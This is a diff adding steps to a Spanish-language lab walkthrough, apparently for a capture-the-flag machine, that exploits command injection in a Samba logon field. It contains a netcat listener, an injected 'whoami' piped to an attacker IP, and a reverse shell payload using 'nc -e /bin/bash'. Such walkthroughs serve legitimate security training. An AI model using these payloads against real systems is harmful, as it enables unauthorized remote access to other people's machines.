@@ -199,3 +199,21 @@ tcpdump -i tun0 icmp -n
 ```smb
 logon "/=`nohup ping -c 1 10.10.14.29`"
 ```
+
+Vemos que obtenemos una respues ejecutando el comando, asi que para empezar eso estaría mal asi que como atacantes ejecutarios los siguientes comandos para ponernos en escucha por el puerto 443:
+
+```zsh
+nc -nlvp 443
+```
+---
+```smb
+logon "/=`nohup whoami | nc 10.10.16.4 443"
+```
+
+De esta manera efectivamente estaríamos ejecutando comando por consola desde la maquina victima, si deseamos podemos confirmar enviando un `ifconfig`
+
+Para ganara acceso nos enviamos una consola interactiva con bash de la siguiente manera:
+
+```zsh
+logon "/=`nohup nc -e /bin/bash 10.10.14.29 443`"
+```
